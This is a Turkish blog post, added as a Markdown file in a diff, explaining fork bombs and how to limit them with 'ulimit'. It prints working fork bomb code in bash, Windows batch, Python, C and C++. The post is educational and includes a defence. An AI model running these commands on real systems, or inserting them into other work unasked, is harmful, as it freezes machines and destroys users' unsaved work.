@@ -1,0 +1,83 @@
+---
+title: "Fork Bomb Nedir?"
+date: "23 Kasım, 2022"
+excerpt: "Fork Bomb, bir işletim sistemindeki işlemciyi yormak için kullanılan bir saldırı yöntemidir. Bu saldırı yöntemi, işletim sistemindeki işlemciyi yormak için bir işlemi sürekli olarak kopyalayarak işlemciyi yormaktadır."
+cover_image: "/blog/Fork-Bomb-Nedir/cover.jpg"
+author:
+  name: "Muhammet Emin Akalan"
+  picture: "https://github.com/05akalan57.png"
+---
+
+Fork Bomb, bir işletim sistemindeki işlemciyi yormak için kullanılan bir saldırı yöntemidir. Bu saldırı yöntemi, işletim sistemindeki işlemciyi yormak için bir işlemi sürekli olarak **kendini kopyalayarak** işlemciyi yormaktadır. Ne kadar güçlü bir işlemciniz olursa olsun sonuç kaçınılmazdır.
+
+## Peki bu saldırı yöntemini nasıl yapabiliriz?
+
+Öncelikle linux işletim sisteminde bir terminal açıyoruz. Ardından aşağıdaki komutu yazıyoruz.
+
+```bash
+:(){ :|:& };:
+```
+
+Peki saldırı sadece linux işletim sisteminde çalışıyor mu? Hayır, saldırı sadece linux işletim sisteminde değil, windows işletim sisteminde de çalışmaktadır. Aşağıdaki komutu windows işletim sisteminde çalıştırırsanız saldırı başlayacaktır.
+
+```batch
+%0|%0
+```
+
+Komutu yazıp çalışırken `CTRL + C` tuşuna basıp iptal etme düşünceniz varsa nafile çünkü komuttaki `&` karakteri işlemi arka plana atar. Bu yüzden komutu çalıştırdıktan sonra `CTRL + C` tuşuna basarak iptal edemezsiniz.
+
+> **Uyarı:** Bu komutu çalıştırdıktan sonra işletim sisteminizi kısa bir süre (Yaklasık 5 Saniye) içinde donmasına işlem yapılamaz hale gelmesine sebep olacaktır. Bu yüzden komutu çalıştırmadan önce işletim sisteminizde önemli bir işlem açık olmadığından emin olun.
+
+<video src="/blog/Fork-Bomb-Nedir/incredibles-2.webm" muted autoPlay loop />
+
+## Diğer Programlama Dillerinde Fork Bomb
+
+Yukarda bahsettiğimiz komutlar Linux özelinde **bash** ve Windows özelinde **batch** komutlarıdır.
+
+Peki diğer programlama dillerinde Fork Bomb nasıl yapılır?
+
+### Python
+
+```python
+import os
+
+while 1:
+  os.fork()
+```
+
+### C
+
+```c
+#include <unistd.h>
+
+int main() {
+  while(1) fork();
+}
+```
+
+### C++
+
+```cpp
+#include <cstdlib>
+
+int main(int argc, char **argv) {
+  while (1) system(argv[0]);
+  return 0;
+}
+```
+
+Yazı uzun olmasın diye sadece 3 dilde yazdım. Diğer dillerde de kullanımını merak ediyorsanız [buradan](https://github.com/aaronryank/fork-bomb) inceleyebilirsiniz.
+
+## Peki bu saldırı yöntemini nasıl engelleyebiliriz?
+
+Bu saldırı yöntemini engellemek için işletim sistemindeki bir çok yöntem bulunmaktadır. Bunlardan bir tanesi kullanıcı bazlı işlem limiti ayarlamaktır. Örnek vermek gerekirse Muhammet Emin Akalan kullanıcısının işlem limiti 1000 olarak ayarlanmış olsun. Bu durumda Muhammet Emin Akalan kullanıcısı 1000 işlemi geçtikten sonra yeni bir işlem açamayacaktır. Bu durumda saldırı başladıktan kısa bir süre sonra limit aşıldığı için saldırı duracaktır.
+
+### İşlem Limiti Ayarlamak
+
+İşlem limiti ayarlamak için aşağıdaki komutu kullanabilirsiniz.
+
+```bash
+ulimit -u 1000
+```
+
+Bu komutu yazdıktan sonra işlem limiti 1000 olarak ayarlanmış olacaktır.
